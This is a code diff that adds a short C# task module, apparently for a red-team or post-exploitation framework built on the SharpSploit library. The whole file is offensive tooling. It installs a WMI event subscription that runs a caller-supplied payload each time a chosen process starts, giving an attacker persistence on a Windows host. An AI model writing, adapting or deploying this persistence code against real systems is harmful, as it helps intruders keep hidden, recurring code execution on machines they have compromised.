@@ -1,0 +1,19 @@
+using System;
+  
+using SharpSploit.Persistence;
+
+public static class Task
+{
+    public static string Execute(string EventName, string ConsumerType, string Payload, string ProcessName, string ScriptEngine)
+    {
+        WMI.EventFilter EventFilter = WMI.EventFilter.ProcessStart;
+        WMI.EventConsumer EventConsumer = (WMI.EventConsumer)Enum.Parse(typeof(WMI.EventConsumer), ConsumerType);
+        WMI.ScriptingEngine ScriptingEngine = (WMI.ScriptingEngine)Enum.Parse(typeof(WMI.ScriptingEngine), ScriptEngine);
+
+        if(WMI.InstallWMIPersistence(EventName, EventFilter, EventConsumer, Payload, ProcessName, ScriptingEngine))
+        {
+            return "WMI subscription for " + ProcessName + " with payload " + Payload + " successfully added";
+        }
+        return "Adding WMI subscription for " + ProcessName + " with payload " + Payload + " failed";
+    }
+}
